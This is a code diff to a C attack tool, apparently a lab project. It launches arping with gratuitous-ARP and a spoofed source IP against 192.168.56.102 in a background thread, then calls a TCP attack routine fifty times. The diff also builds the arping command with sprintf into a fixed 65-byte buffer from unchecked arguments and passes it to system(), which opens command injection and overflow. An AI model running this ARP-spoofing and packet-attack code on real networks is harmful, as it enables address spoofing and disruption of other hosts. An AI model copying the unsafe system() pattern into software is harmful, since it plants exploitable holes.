@@ -17,19 +17,11 @@ void hostname_toip(char *dst, struct in_addr *dst_ip);
 char* get_local_ip();
 void start_tcp_attack(char *argv[]);
 void send_arp(char *argv[]);
-void prepare_arping(char *argv[]);
+void call_arping(char *argv[]);
 
 int tcp_gen(int argc, char *argv[])
 {
 
-    /*---------------------------------------
-    TODO:
-
-    --figure out a way how to run this program
-    as root without running with sudo (qtcreator)
-    ideally use setuid() function or something
-    like that
-    ---------------------------------------*/
     //if(argc < 4)
     //{
     //    fprintf(stderr, "Usage: ./raw <Hostname> <Query string> <NIC [eth0, wlan0]>\n");
@@ -45,7 +37,7 @@ int tcp_gen(int argc, char *argv[])
 
     char *ip_array[5];
 
-    ip_array[0] = argv[0];//prog. name
+    ip_array[0] = argv[0];//attack type
     ip_array[1] = argv[1];//hostname
     ip_array[2] = argv[2];//URI
     ip_array[3] = argv[3];//dev
@@ -63,19 +55,25 @@ int tcp_gen(int argc, char *argv[])
     }
 
     //char *args[] = {"-q", "-A", "-I", ip_array[3], "-s", ip_array[4], "192.168.56.102"};
-    char *args[] = {ip_array[3], ip_array[4]};
+    //
+    //int ret = system("/usr/bin/arping -q -A -I vboxnet0 -s 192.168.56.150 192.168.56.102");
+    //if (WIFSIGNALED(ret) && (WTERMSIG(ret) == SIGINT || WTERMSIG(ret) == SIGQUIT))
+    //   return 0;
+
+    char *params[] = {ip_array[3], ip_array[4]};
     
     pthread_t arping_th;
 
-    if(pthread_create(&arping_th, NULL, (void *) prepare_arping, args) < 0)
+    if(pthread_create(&arping_th, NULL, (void *) call_arping, params) < 0)
     {
         fprintf(stderr, "Failed to create a thread for arping.\n");
         return -1;
     }
-    pthread_detach(arping_th);
+    if ( pthread_detach(arping_th) == 0 )
+        printf("Arping thread detached successfully !!!\n");
 
     sleep(1);
-    for(int i = 0; i < 10; i++)
+    for(int i = 0; i < 50; i++)
     {
         //sleep(1);
         start_tcp_attack(ip_array);
@@ -257,10 +255,16 @@ void hostname_toip(char *dst, struct in_addr *dst_ip)
     //printf("Translated as: %s\n", inet_ntoa(*dst_ip));
 }
 
-void prepare_arping(char *argv[])
+void call_arping(char *argv[])
 {
+    //sleep(2);
+    char arping_params[65];
+    sprintf(arping_params, "/usr/bin/arping -q -A -I %s -s %s 192.168.56.102", argv[0], argv[1]);
+    //printf("\nArping params: %s\n", arping_params);
+
+
     //{"-q", "-A", "-I", ip_array[3], "-s", ip_array[4], "192.168.56.102"};
-    //int args_count = 3;
+    //int args_count = 7;
     ////char *params[args_count];
     ////
     //for(int i = 0; i < args_count; i++)
@@ -268,12 +272,11 @@ void prepare_arping(char *argv[])
     ////    params[i] = argv[i];
     //    printf("arping: %s\n", argv[i]);
     //}
+    system(arping_params);
+    //execl("/usr/bin/arping", "-A", "-I", argv[0], "-q",  "-s", argv[1], "192.168.56.102", (char *) NULL);
 
-    //execl("/bin/sh", "sh", "-c", command, (char *) 0);))
-    //system("/usr/bin/arping -q -A -I vboxnet0 -s 192.168.56.150 192.168.56.102");
-    execl("arping", "-q -A -I", argv[0], "-s", argv[1], "192.168.56.102", (char *) NULL);
-    //these parameters have to be specified exactly in this order with -q in front
-    //arping_main(args_count, params);
+    //thee parameters have to be specified exactly in this order with -q in front
+    //arping_main(args_count, argv);
 }
 
 /*char* get_local_ip()
